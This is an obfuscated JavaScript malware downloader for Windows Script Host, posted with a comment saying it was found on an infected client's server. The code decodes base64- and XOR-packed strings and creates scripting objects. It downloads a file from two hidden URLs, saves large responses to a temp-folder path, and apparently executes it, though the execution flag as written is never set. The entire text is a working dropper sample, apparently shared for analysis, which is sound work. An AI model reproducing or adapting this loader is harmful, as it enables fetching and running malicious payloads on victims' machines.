
// This script was found on an infected clients server, I will be uploading
// an Un-obfuscated copy as well.


var _base64Idx = [
    /*43 -43 = 0*/
    /*'+',  1,  2,  3,'/' */
    62, -1, -1, -1, 63,

    /*'0','1','2','3','4','5','6','7','8','9' */
    52, 53, 54, 55, 56, 57, 58, 59, 60, 61,

    /*15, 16, 17,'=', 19, 20, 21 */
    -1, -1, -1, 64, -1, -1, -1,

    /*65 - 43 = 22*/
    /*'A','B','C','D','E','F','G','H','I','J','K','L','M', */
    0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12,

    /*'N','O','P','Q','R','S','T','U','V','W','X','Y','Z' */
    13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25,

    /*91 - 43 = 48 */
    /*48, 49, 50, 51, 52, 53 */
    -1, -1, -1, -1, -1, -1,

    /*97 - 43 = 54*/
    /*'a','b','c','d','e','f','g','h','i','j','k','l','m' */
    26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38,

    /*'n','o','p','q','r','s','t','u','v','w','x','y','z' */
    39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51
];

function decode(input, output, offset) {
    var out = output;
    if(!out) {
        out = new Uint8Array(Math.ceil(input.length / 4) * 3);
    }

	input = input.replace(/[^A-Za-z0-9\+\/\=]/g, '');
	offset = offset || 0;
	var enc1, enc2, enc3, enc4;
	var i = 0, j = offset;

	while(i < input.length) {
		enc1 = _base64Idx[input.charCodeAt(i++) - 43];
		enc2 = _base64Idx[input.charCodeAt(i++) - 43];
		enc3 = _base64Idx[input.charCodeAt(i++) - 43];
		enc4 = _base64Idx[input.charCodeAt(i++) - 43];

		out[j++] = (enc1 << 2) | (enc2 >> 4);
		if(enc3 !== 64) {
			out[j++] = ((enc2 & 15) << 4) | (enc3 >> 2);
			if(enc4 !== 64) {
				out[j++] = ((enc3 & 3) << 6) | enc4;
			}
		}
	}

	return output ?
        	(j - offset) :
        	out.subarray(0, j);
}

var jIe4wK8cFS = function (packedText) {

    var buffer = [];
    var length = decode(packedText, buffer);
    var charCodeAt = "charCodeAt";
    var result = "";
    for (var i = 0; i < length; i++) {
        result += String.fromCharCode(buffer[i] ^ "frtV2f9a3zh6W2iH"[charCodeAt](i % "frtV2f9a3zh6W2iH".length));
    }
    return result;
};
var sultrysZf = function() {
    var unassumingw2Y = function() {};
    unassumingw2Y.prototype.create = function(volublerzG) {
        return WScript.CreateObject(volublerzG);
    };
    return unassumingw2Y;
}();

(function() {
    var disgorgeOmL = new sultrysZf();
    var foistX8F = 200;
    var notwithstandingRqL = jIe4wK8cFS('"ITcg"');
    var sentinelFbM = jIe4wK8cFS('"IwoRNQ=="');
    var preternaturalsKK = jIe4wK8cFS('"MSEXJFsWTU9gEg1aOw=="');
    var firebrandNBi = jIe4wK8cFS('"KyEsG35UFzl+NiBiA2I="');
    var didacticccT = jIe4wK8cFS('"NxQHHHAEVA1gFA=="');
    var palliatelfx = jIe4wK8cFS('"KUVNYWshTFh5OQ=="');
    var encumberzqD = jIe4wK8cFS('"KzwwM3AObAdGMw=="');
    var enervaterr8 = jIe4wK8cFS('"M0A/OnkJaDJ3Pg=="');
    var gustyJm6 = jIe4wK8cFS('"JzY7EnA="');
    var interdicto7i = jIe4wK8cFS('"NQYGM1ML"');
    var exorbitantSzN = jIe4wK8cFS('"QyYxG2JDZQ=="');
    var conceptsjG = jIe4wK8cFS('"SBcMMw=="');
    var pacifisthxc = Math.pow(2, 10) * 249;
    var suavityv52 = [ jIe4wK8cFS('"DgYAJghJFglWFgRZLl0cJgEfFThDFxcCXBdHBGEcDDAD"'), jIe4wK8cFS('"DgYAJghJFglWFgRZLl0cJgEfFThUABcCXBdHBGEcDDAD"') ];
    var herculeanLKY = 2097152;
    var gratisI38 = disgorgeOmL.create(preternaturalsKK);
    var rampartnN6 = disgorgeOmL.create(firebrandNBi);
    var furnishe1e = disgorgeOmL.create(gustyJm6 + jIe4wK8cFS('"SA=="') + interdicto7i);
    var pacifistYY4 = gratisI38.ExpandEnvironmentStrings(exorbitantSzN);
    var ensconceMUl = pacifistYY4 + herculeanLKY + conceptsjG;
    var insensateimn = false;
    for (var elaborateDqD = 0; elaborateDqD < suavityv52.length; elaborateDqD++) {
        try {
            var extenuatecJR = suavityv52[elaborateDqD];
            rampartnN6.open(notwithstandingRqL, extenuatecJR, false);
            rampartnN6.send();
            if (rampartnN6.status == foistX8F) {
                try {
                    furnishe1e.open();
                    furnishe1e.type = 1;
                    furnishe1e.write(rampartnN6[jIe4wK8cFS('"FBcHJl0ISgRxFQxP"')]);
                    if (furnishe1e.size > pacifisthxc) {
                        elaborateDqD = suavityv52.length;
                        furnishe1e.position = 0;
                        furnishe1e.saveToFile(ensconceMUl, 2);
                        insensateimn = false;
                    }
                } finally {
                    furnishe1e.close();
                }
            }
        } catch (ignored) {}
    }
    if (insensateimn) {
        gratisI38[sentinelFbM](pacifistYY4 + Math.pow(2, 21));
    }
})();
